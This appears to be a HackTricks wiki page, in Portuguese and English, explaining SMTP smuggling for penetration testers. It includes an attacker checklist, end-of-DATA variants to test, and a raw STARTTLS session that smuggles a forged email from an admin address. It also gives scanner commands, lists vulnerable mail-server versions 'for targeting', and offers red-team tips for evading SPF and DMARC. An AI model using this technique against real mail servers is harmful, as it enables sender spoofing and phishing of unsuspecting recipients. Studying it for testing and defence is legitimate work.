# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

Este tipo de vulnerabilidade foi [**originalmente descoberta neste post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) onde é explicado que é possível **explorar discrepâncias em como o protocolo SMTP é interpretado** ao finalizar um e‑mail, permitindo que um atacante contrabandeie mais e‑mails no corpo do legítimo, permitindo se passar por outros usuários do domínio afetado (por exemplo admin@outlook.com) contornando defesas como SPF.

### Por que

Isto acontece porque no protocolo SMTP, os **dados da mensagem** a serem enviados no e‑mail são controlados por um usuário (atacante) que pode enviar dados especialmente criados abusando diferenças em parsers que irão contrabandear e‑mails extras para o receptor. Veja este exemplo ilustrado do post original:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Como

Para explorar essa vulnerabilidade, um atacante precisa enviar alguns dados que o **servidor SMTP de saída acha que é apenas 1 e‑mail, mas o servidor SMTP de entrada acha que são vários e‑mails**.

Os pesquisadores descobriram que diferentes **servidores de entrada consideram caracteres diferentes como o fim dos dados** da mensagem de e‑mail que os servidores de saída não consideram.\
Por exemplo, um fim de dados regular é `\r\n.\r`. Mas se o servidor SMTP de entrada também aceitar `\n.`, um atacante poderia simplesmente adicionar **esses dados no seu e‑mail e começar a indicar os comandos SMTP** de um novo e‑mail para contrabandeá‑lo, exatamente como na imagem anterior.

Obviamente, isso só funciona se o **servidor SMTP de saída não tratar também esses dados** como fim da mensagem, pois nesse caso ele verá 2 e‑mails em vez de 1, então no fim é essa dessincronização que está sendo abusada nessa vulnerabilidade.

Dados potenciais de dessincronização:

- `\n.`
- `\n.\r`

Note também que o SPF é contornado porque, se você contrabandeia um e‑mail de `admin@outlook.com` a partir de um e‑mail de `user@outlook.com`, **o remetente ainda é `outlook.com`.**

---

## Checklist do atacante (quais condições devem ser atendidas?)

Para contrabandear com sucesso um segundo e‑mail, tipicamente você precisa:

- Um servidor de saída A pelo qual você possa enviar (frequentemente com credenciais válidas) que encaminhe uma sequência de fim‑de‑DATA não‑padrão sem alterá‑la. Muitos serviços historicamente encaminharam variantes como `\n.\r\n` ou `\n.\n`.
- Um servidor receptor B que irá interpretar essa sequência não‑padrão como fim‑de‑DATA e então parsear o que vier a seguir como novos comandos SMTP (MAIL/RCPT/DATA...).
- O outbound deve realmente enviar usando `DATA` (não `BDAT`). Se A suporta CHUNKING/BDAT, o contrabando só funciona se ele recuar para DATA (por exemplo, B não anuncia CHUNKING), caso contrário o BDAT com comprimento evita ambiguidade.
- PIPELINING não é obrigatório, mas ajuda a esconder os comandos injetados em uma única escrita TCP para que dispositivos intermediários não ressincronizem.

Variantes comuns de fim‑de‑DATA que valem testar (dependem do receptor):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (CR isolado no final)

Nota: O que funciona é a intersecção de “o que A encaminha” ∩ “o que B aceita”.

---

## Exemplo de exploração manual (sessão única)

O seguinte mostra a ideia usando uma sessão STARTTLS SMTP raw. Após o primeiro bloco DATA inserimos um terminador não‑padrão, então outro diálogo SMTP que o servidor receptor pode tratar como uma nova mensagem.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
Se A encaminha `\n.\r\n` e B o aceita como end‑of‑DATA, a mensagem “hello B” pode ser aceita como um segundo e‑mail de `admin@target.com` enquanto passa no SPF (alinhado com os IPs de A).
</details>

Tip: Ao testar interativamente, garanta que `-crlf` seja usado para que o OpenSSL preserve CRLF no que você digita.

---

## Automation and scanners

- hannob/smtpsmug: envia uma mensagem terminando com múltiplas sequências malformadas de end‑of‑DATA para ver o que um receptor aceita.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner para ambos os lados inbound e outbound, além de um servidor SMTP de análise para ver exatamente quais sequências sobrevivem a um sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Notes on affected software and fixes (for targeting)

- Postfix: prior to 3.9 the default tolerated bare LFs; from 3.5.23/3.6.13/3.7.9/3.8.4 admins can enable `smtpd_forbid_bare_newline`. Current recommendation is `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) or set to `reject` for strict RFC enforcement.
- Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Older 4.97/4.96 may be exploitable depending on PIPELINING/CHUNKING.
- Sendmail: fixed in 8.18; older 8.17.x accepted some non‑standard terminators.
- Various libraries/servers (e.g., aiosmtpd before 1.4.5, some vendor gateways, and specific SaaS relays) had similar issues; modern versions tend to accept DATA only with strict `<CR><LF>.<CR><LF>`.

Use the scanners above to verify current behavior; many vendors changed defaults in early 2024–2025.

---

## Tips for red team ops

- Favor large commodity senders for A (historically Exchange Online, shared hosters, etc.). If they still forward some non‑standard EOM and they’re in the victim’s SPF, your smuggled MAIL FROM will inherit their reputation.
- Enumerate B’s SMTP extensions: `EHLO` banner for PIPELINING/CHUNKING; if CHUNKING is missing you have a better chance from BDAT‑first senders. Combine with malformed EOMs to probe acceptance.
- Watch headers: the smuggled message will usually create a separate Received chain starting at B. DMARC will often pass because MAIL FROM aligns with A’s IP space.

---

## **Referências**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
